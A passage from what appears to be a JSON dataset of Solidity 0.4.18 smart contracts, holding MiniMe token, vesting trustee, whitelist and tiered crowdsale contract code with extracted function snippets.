_blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if ((totalSupplyHistory.length == 0)\n || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function createCloneToken(\n string _cloneTokenName,\n uint8 _cloneDecimalUnits,\n string _cloneTokenSymbol,\n uint _snapshotBlock,\n bool _transfersEnabled\n ) public returns(address) {\n if (_snapshotBlock == 0) _snapshotBlock = block.number;\n MiniMeToken cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _cloneTokenName,\n _cloneDecimalUnits,\n _cloneTokenSymbol,\n _transfersEnabled\n );\n cloneToken.changeController(msg.sender);\n NewCloneToken(address(cloneToken), _snapshotBlock);\n return address(cloneToken);\n }\n function generateTokens(address _owner, uint _amount\n ) public onlyController returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _amount >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n Transfer(0, _owner, _amount);\n return true;\n }\n function destroyTokens(address _owner, uint _amount\n ) onlyController public returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply >= _amount);\n uint previousBalanceFrom = balanceOf(_owner);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\n updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\n Transfer(_owner, 0, _amount);\n return true;\n }\n function enableTransfers(bool _transfersEnabled) public onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender));\n }\n function claimTokens(address _token) public onlyController {\n if (_token == 0x0) {\n controller.transfer(this.balance);\n return;\n }\n MiniMeToken token = MiniMeToken(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n ClaimedTokens(_token, controller, balance);\n }\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract MiniMeTokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public returns (MiniMeToken) {\n MiniMeToken newToken = new MiniMeToken(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _decimalUnits,\n _tokenSymbol,\n _transfersEnabled\n );\n newToken.changeController(msg.sender);\n return newToken;\n }\n}\ncontract Whitelist is Ownable {\n mapping(address => bool) public whitelist;\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n modifier onlyWhitelisted() {\n require(whitelist[msg.sender]);\n _;\n }\n function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {\n if (!whitelist[addr]) {\n whitelist[addr] = true;\n WhitelistedAddressAdded(addr);\n success = true;\n }\n }\n function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (addAddressToWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {\n if (whitelist[addr]) {\n whitelist[addr] = false;\n WhitelistedAddressRemoved(addr);\n success = true;\n }\n }\n function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (removeAddressFromWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n}\ncontract Crowdsale is Presale, Pausable, CanReclaimToken, Whitelist {\n using SafeMath for uint256;\n address public whitelistAddress;\n address public wallet;\n MiniMeToken public token;\n uint256 private weiRaised = 0;\n uint256 private cap = 0;\n bool private publicSaleInitialized = false;\n bool private finalized = false;\n uint256 private tokensSold = 0;\n uint256 private startTime;\n uint256 private endTime;\n uint256 public maxTokens;\n mapping(address => uint256) public contributions;\n mapping(address => uint256) public investorCaps;\n address[] public investors;\n address[] public founders;\n address[] public advisors;\n VestingTrustee public trustee;\n address public reserveWallet;\n struct Tier {\n uint256 rate;\n uint256 max;\n }\n uint public privateSaleTokensAvailable;\n uint public privateSaleTokensSold = 0;\n uint public publicTokensAvailable;\n uint8 public totalTiers = 0;\n bool public tiersInitialized = false;\n uint256 public maxTiers = 6;\n Tier[6] public tiers;\n event TokenPurchase(address indexed purchaser, uint256 value, uint256 amount);\n enum Stage { Preparing, Presale, PresaleFinished, PublicSale, Success, Finalized }\n function Crowdsale(\n uint256 _presaleStartTime,\n uint256 _presaleDuration,\n uint256 _presaleRate,\n uint256 _presaleCap,\n address erc20Token,\n address _wallet,\n uint8 _tiers,\n uint256 _cap,\n address _reserveWallet)\n public\n Presale(_presaleStartTime, _presaleDuration, _presaleRate, _presaleCap)\n {\n require(_wallet != address(0));\n require(erc20Token != address(0));\n require(_tiers > 0 && _tiers <= maxTiers);\n require(_cap > 0);\n require(_reserveWallet != address(0));\n token = MiniMeToken(erc20Token);\n wallet = _wallet;\n totalTiers = _tiers;\n cap = _cap;\n reserveWallet = _reserveWallet;\n trustee = new VestingTrustee(erc20Token);\n maxTokens = 1000000000 * (10 ** 18);\n privateSaleTokensAvailable = maxTokens.mul(22).div(100);\n publicTokensAvailable = maxTokens.mul(28).div(100);\n super.addAddressToWhitelist(msg.sender);\n }\n function() public payable {\n buyTokens(msg.sender, msg.value);\n }\n function getStage() public constant returns(Stage) {\n if (finalized) return Stage.Finalized;\n if (!tiersInitialized || !Presale.hasStarted()) return Stage.Preparing;\n if (!Presale.hasEnded()) return Stage.Presale;\n if (Presale.hasEnded() && !hasStarted()) return Stage.PresaleFinished;\n if (!hasEnded()) return Stage.PublicSale;\n if (hasEnded()) return Stage.Success;\n return Stage.Preparing;\n }\n modifier inStage(Stage _stage) {\n require(getStage() == _stage);\n _;\n }\n function initTiers(uint256[] rates, uint256[] totalWeis) public onlyWhitelisted returns(uint256) {\n require(token.controller() == address(this));\n require(!tiersInitialized);\n require(rates.length == totalTiers && rates.length == totalWeis.length);\n uint256 tierMax = 0;\n for (uint8 i=0; i < totalTiers; i++) {\n require(totalWeis[i] > 0 && rates[i] > 0);\n tierMax = tierMax.add(totalWeis[i]);\n tiers[i] = Tier({\n rate: rates[i],\n max: tierMax\n });\n }\n require(tierMax == cap);\n tiersInitialized = true;\n return tierMax;\n }\n function setCapForParticipants(address[] participants, uint256[] caps) onlyWhitelisted public {\n require(participants.length <= 50 && participants.length == caps.length);\n for (uint8 i=0; i < participants.length; i++) {\n investorCaps[participants[i]] = caps[i];\n }\n }\n function addGrant(address assignee, uint256 value, bool isFounder) public onlyWhitelisted whenNotPaused {\n require(value > 0);\n require(assignee != address(0));\n uint256 start;\n uint256 cliff;\n uint256 vestingPercentage;\n uint256 initialTokens;\n if(isFounder) {\n start = now;\n cliff = start + 12*30 days;\n vestingPercentage = 20;\n founders.push(assignee);\n }\n else {\n initialTokens = value.mul(10).div(100);\n transferTokens(assignee, initialTokens);\n start = now;\n cliff = start + 6*30 days;\n vestingPercentage = 15;\n advisors.push(assignee);\n }\n uint256 end = now + 3 * 1 years;\n uint256 installmentLength = 6 * 30 days;\n bool revokable = true;\n transferTokens(trustee, value.sub(initialTokens));\n trustee.grant(assignee, value, start, cliff, end, installmentLength, vestingPercentage, initialTokens, revokable);\n }\n function finalize() public onlyWhitelisted inStage(Stage.Success) {\n require(!finalized);\n trustee.transferOwnership(msg.sender);\n token.enableTransfers(true);\n uint256 unsold = maxTokens.sub(token.totalSupply());\n transferTokens(reserveWallet, unsold);\n token.changeController(0x0);\n finalized = true;\n }\n function startPublicSale(uint _startTime, uint _duration) public onlyWhitelisted inStage(Stage.PresaleFinished) {\n require(_startTime >= now);\n require(_duration > 0);\n startTime = _startTime;\n endTime = _startTime + _duration * 1 days;\n publicSaleInitialized = true;\n }\n function totalWei() public constant returns(uint256) {\n uint256 presaleWei = super.totalWei();\n return presaleWei.add(weiRaised);\n }\n function totalPublicSaleWei() public constant returns(uint256) {\n return weiRaised;\n }\n function totalCap() public constant returns(uint256) {\n uint256 presaleCap = super.totalCap();\n return presaleCap.add(cap);\n }\n function totalTokens() public constant returns(uint256) {\n return tokensSold;\n }\n function buyTokens(address purchaser, uint256 value) internal whenNotPaused returns(uint256) {\n require(value > 0);\n Stage stage = getStage();\n require(stage == Stage.Presale || stage == Stage.PublicSale);\n uint256 purchaseAmount = Math.min256(value, investorCaps[purchaser].sub(contributions[purchaser]));\n require(purchaseAmount > 0);\n uint256 numTokens;\n if (stage == Stage.Presale) {\n if (Presale.totalWei().add(purchaseAmount) > Presale.totalCap()) {\n purchaseAmount = Presale.capRemaining();\n }\n numTokens = Presale.buyTokens(purchaser, purchaseAmount);\n } else if (stage == Stage.PublicSale) {\n uint totalWei = weiRaised.add(purchaseAmount);\n uint8 currentTier = getTier(weiRaised);\n if (totalWei >= cap) {\n totalWei = cap;\n purchaseAmount = cap.sub(weiRaised);\n }\n if (totalWei <= tiers[currentTier].max) {\n numTokens = purchaseAmount.mul(tiers[currentTier].rate);\n } else {\n uint remaining = tiers[currentTier].max.sub(weiRaised);\n numTokens = remaining.mul(tiers[currentTier].rate);\n uint256 excess = totalWei.sub(tiers[currentTier].max);\n numTokens = numTokens.add(excess.mul(tiers[currentTier + 1].rate));\n }\n weiRaised = weiRaised.add(purchaseAmount);\n }\n require(tokensSold.add(numTokens) <= publicTokensAvailable);\n tokensSold = tokensSold.add(numTokens);\n forwardFunds(purchaser, purchaseAmount);\n transferTokens(purchaser, numTokens);\n if (value.sub(purchaseAmount) > 0) {\n msg.sender.transfer(value.sub(purchaseAmount));\n }\n TokenPurchase(purchaser, numTokens, purchaseAmount);\n return numTokens;\n }\n function forwardFunds(address purchaser, uint256 value) internal {\n if (contributions[purchaser] == 0) {\n investors.push(purchaser);\n }\n contributions[purchaser] = contributions[purchaser].add(value);\n wallet.transfer(value);\n }\n function changeEndTime(uint _endTime) public onlyWhitelisted {\n endTime = _endTime;\n }\n function changeFundsWallet(address _newWallet) public onlyWhitelisted {\n require(_newWallet != address(0));\n wallet = _newWallet;\n }\n function changeTokenController() onlyWhitelisted public {\n token.changeController(msg.sender);\n }\n function changeTrusteeOwner() onlyWhitelisted public {\n trustee.transferOwnership(msg.sender);\n }\n function changeReserveWallet(address _reserve) public onlyWhitelisted {\n require(_reserve != address(0));\n reserveWallet = _reserve;\n }\n function setWhitelistAddress(address _whitelist) public onlyWhitelisted {\n require(_whitelist != address(0));\n whitelistAddress = _whitelist;\n }\n function transferTokens(address to, uint256 value) internal {\n token.generateTokens(to, value);\n }\n function sendPrivateSaleTokens(address to, uint256 value) public whenNotPaused onlyWhitelisted {\n require(privateSaleTokensSold.add(value) <= privateSaleTokensAvailable);\n privateSaleTokensSold = privateSaleTokensSold.add(value);\n transferTokens(to, value);\n }\n function hasEnded() internal constant returns(bool) {\n return now > endTime || weiRaised >= cap;\n }\n function hasStarted() internal constant returns(bool) {\n return publicSaleInitialized && now >= startTime;\n }\n function getTier(uint256 _weiRaised) internal constant returns(uint8) {\n for (uint8 i = 0; i < totalTiers; i++) {\n if (_weiRaised < tiers[i].max) {\n return i;\n }\n }\n return totalTiers + 1;\n }\n function getCurrentTier() public constant returns(uint8) {\n return getTier(weiRaised);\n }\n function proxyPayment(address _owner) public payable returns(bool) {\n return true;\n }\n function onApprove(address _owner, address _spender, uint _amount) public returns(bool) {\n return true;\n }\n function onTransfer(address _from, address _to, uint _amount) public returns(bool) {\n return true;\n }\n function getTokenSaleTime() public constant returns(uint256, uint256) {\n return (startTime, endTime);\n }\n}",
  "extract_feature": [
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b78"
  },
  "filename": "3291.sol",
  "content": "pragma solidity 0.4.18;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary Math {\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract Presale {\n using SafeMath for uint256;\n uint256 private weiRaised;\n uint256 private startTime;\n uint256 private endTime;\n uint256 private rate;\n uint256 private cap;\n function Presale(uint256 _startTime, uint256 duration, uint256 _rate, uint256 _cap) public {\n require(_rate > 0);\n require(_cap > 0);\n require(_startTime >= now);\n require(duration > 0);\n rate = _rate;\n cap = _cap;\n startTime = _startTime;\n endTime = startTime + duration * 1 days;\n weiRaised = 0;\n }\n function totalWei() public constant returns(uint256) {\n return weiRaised;\n }\n function capRemaining() public constant returns(uint256) {\n return cap.sub(weiRaised);\n }\n function totalCap() public constant returns(uint256) {\n return cap;\n }\n function buyTokens(address purchaser, uint256 value) internal returns(uint256) {\n require(validPurchase(value));\n uint256 tokens = rate.mul(value);\n weiRaised = weiRaised.add(value);\n return tokens;\n }\n function hasEnded() internal constant returns(bool) {\n return now > endTime || weiRaised >= cap;\n }\n function hasStarted() internal constant returns(bool) {\n return now > startTime;\n }\n function validPurchase(uint256 value) internal view returns (bool) {\n bool withinCap = weiRaised.add(value) <= cap;\n return withinCap && withinPeriod();\n }\n function presaleRate() public view returns(uint256) {\n return rate;\n }\n function withinPeriod () private constant returns(bool) {\n return now >= startTime && now <= endTime;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract CanReclaimToken is Ownable {\n using SafeERC20 for ERC20Basic;\n function reclaimToken(ERC20Basic token) external onlyOwner {\n uint256 balance = token.balanceOf(this);\n token.safeTransfer(owner, balance);\n }\n}\ncontract VestingTrustee is Ownable, CanReclaimToken {\n using SafeMath for uint256;\n ERC20 public token;\n struct Grant {\n uint256 value;\n uint256 start;\n uint256 cliff;\n uint256 end;\n uint256 installmentLength;\n uint256 transferred;\n bool revokable;\n uint256 prevested;\n uint256 vestingPercentage;\n }\n mapping (address => Grant) public grants;\n uint256 public totalVesting;\n event NewGrant(address indexed _from, address indexed _to, uint256 _value);\n event TokensUnlocked(address indexed _to, uint256 _value);\n event GrantRevoked(address indexed _holder, uint256 _refund);\n function VestingTrustee(address _token) {\n require(_token != address(0));\n token = ERC20(_token);\n }\n function grant(address _to, uint256 _value, uint256 _start, uint256 _cliff, uint256 _end,\n uint256 _installmentLength, uint256 vestingPercentage, uint256 prevested, bool _revokable)\n external onlyOwner {\n require(_to != address(0));\n require(_to != address(this));\n require(_value > 0);\n require(_value.sub(prevested) > 0);\n require(vestingPercentage > 0);\n require(grants[_to].value == 0);\n require(_start <= _cliff && _cliff <= _end);\n require(_installmentLength > 0 && _installmentLength <= _end.sub(_start));\n require(totalVesting.add(_value.sub(prevested)) <= token.balanceOf(address(this)));\n grants[_to] = Grant({\n value: _value,\n start: _start,\n cliff: _cliff,\n end: _end,\n installmentLength: _installmentLength,\n transferred: prevested,\n revokable: _revokable,\n prevested: prevested,\n vestingPercentage: vestingPercentage\n });\n totalVesting = totalVesting.add(_value.sub(prevested));\n NewGrant(msg.sender, _to, _value);\n }\n function revoke(address _holder) public onlyOwner {\n Grant memory grant = grants[_holder];\n require(grant.revokable);\n uint256 refund = grant.value.sub(grant.transferred);\n delete grants[_holder];\n totalVesting = totalVesting.sub(refund);\n token.transfer(msg.sender, refund);\n GrantRevoked(_holder, refund);\n }\n function vestedTokens(address _holder, uint256 _time) external constant returns (uint256) {\n Grant memory grant = grants[_holder];\n if (grant.value == 0) {\n return 0;\n }\n return calculateVestedTokens(grant, _time);\n }\n function calculateVestedTokens(Grant _grant, uint256 _time) private constant returns (uint256) {\n if (_time < _grant.cliff) {\n return _grant.prevested;\n }\n if (_time >= _grant.end) {\n return _grant.value;\n }\n uint256 installmentsPast = _time.sub(_grant.cliff).div(_grant.installmentLength) + 1;\n return _grant.prevested.add(_grant.value.mul(installmentsPast.mul(_grant.vestingPercentage)).div(100));\n }\n function unlockVestedTokens() external {\n Grant storage grant = grants[msg.sender];\n require(grant.value != 0);\n uint256 vested = calculateVestedTokens(grant, now);\n if (vested == 0) {\n revert();\n }\n uint256 transferable = vested.sub(grant.transferred);\n if (transferable == 0) {\n revert();\n }\n grant.transferred = grant.transferred.add(transferable);\n totalVesting = totalVesting.sub(transferable);\n token.transfer(msg.sender, transferable);\n TokensUnlocked(msg.sender, transferable);\n }\n function reclaimEther() external onlyOwner {\n assert(owner.send(this.balance));\n }\n}\ncontract Controlled {\n modifier onlyController { require(msg.sender == controller); _; }\n address public controller;\n function Controlled() public { controller = msg.sender;}\n function changeController(address _newController) public onlyController {\n controller = _newController;\n }\n}\ncontract TokenController {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public\n returns(bool);\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract MiniMeToken is Controlled {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'MMT_0.2';\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n MiniMeToken public parentToken;\n uint public parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n MiniMeTokenFactory public tokenFactory;\n function MiniMeToken(\n address _tokenFactory,\n address _parentToken,\n uint _parentSnapShotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public {\n tokenFactory = MiniMeTokenFactory(_tokenFactory);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n parentToken = MiniMeToken(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n transfersEnabled = _transfersEnabled;\n creationBlock = block.number;\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n doTransfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n if (msg.sender != controller) {\n require(transfersEnabled);\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n }\n doTransfer(_from, _to, _amount);\n return true;\n }\n function doTransfer(address _from, address _to, uint _amount\n ) internal {\n if (_amount == 0) {\n Transfer(_from, _to, _amount);\n return;\n }\n require(parentSnapShotBlock < block.number);\n require((_to != 0) && (_to != address(this)));\n var previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n var previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n Transfer(_from, _to, _amount);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOfAt(address _owner, uint _blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if ((totalSupplyHistory.length == 0)\n || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function createCloneToken(\n string _cloneTokenName,\n uint8 _cloneDecimalUnits,\n string _cloneTokenSymbol,\n uint _snapshotBlock,\n bool _transfersEnabled\n ) public returns(address) {\n if (_snapshotBlock == 0) _snapshotBlock = block.number;\n MiniMeToken cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _cloneTokenName,\n _cloneDecimalUnits,\n _cloneTokenSymbol,\n _transfersEnabled\n );\n cloneToken.changeController(msg.sender);\n NewCloneToken(address(cloneToken), _snapshotBlock);\n return address(cloneToken);\n }\n function generateTokens(address _owner, uint _amount\n ) public onlyController returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _amount >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n Transfer(0, _owner, _amount);\n return true;\n }\n function destroyTokens(address _owner, uint _amount\n ) onlyController public returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply >= _amount);\n uint previousBalanceFrom = balanceOf(_owner);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\n updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\n Transfer(_owner, 0, _amount);\n return true;\n }\n function enableTransfers(bool _transfersEnabled) public onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender));\n }\n function claimTokens(address _token) public onlyController {\n if (_token == 0x0) {\n controller.transfer(this.balance);\n return;\n }\n MiniMeToken token = MiniMeToken(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n ClaimedTokens(_token, controller, balance);\n }\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract MiniMeTokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public returns (MiniMeToken) {\n MiniMeToken newToken = new MiniMeToken(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _decimalUnits,\n _tokenSymbol,\n _transfersEnabled\n );\n newToken.changeController(msg.sender);\n return newToken;\n }\n}\ncontract Whitelist is Ownable {\n mapping(address => bool) public whitelist;\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n modifier onlyWhitelisted() {\n require(whitelist[msg.sender]);\n _;\n }\n function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {\n if (!whitelist[addr]) {\n whitelist[addr] = true;\n WhitelistedAddressAdded(addr);\n success = true;\n }\n }\n function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (addAddressToWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {\n if (whitelist[addr]) {\n whitelist[addr] = false;\n WhitelistedAddressRemoved(addr);\n success = true;\n }\n }\n function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (removeAddressFromWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n}\ncontract Crowdsale is Presale, Pausable, CanReclaimToken, Whitelist {\n using SafeMath for uint256;\n address public whitelistAddress;\n address public wallet;\n MiniMeToken public token;\n uint256 private weiRaised = 0;\n uint256 private cap = 0;\n bool private publicSaleInitialized = false;\n bool private finalized = false;\n uint256 private tokensSold = 0;\n uint256 private startTime;\n uint256 private endTime;\n uint256 public maxTokens;\n mapping(address => 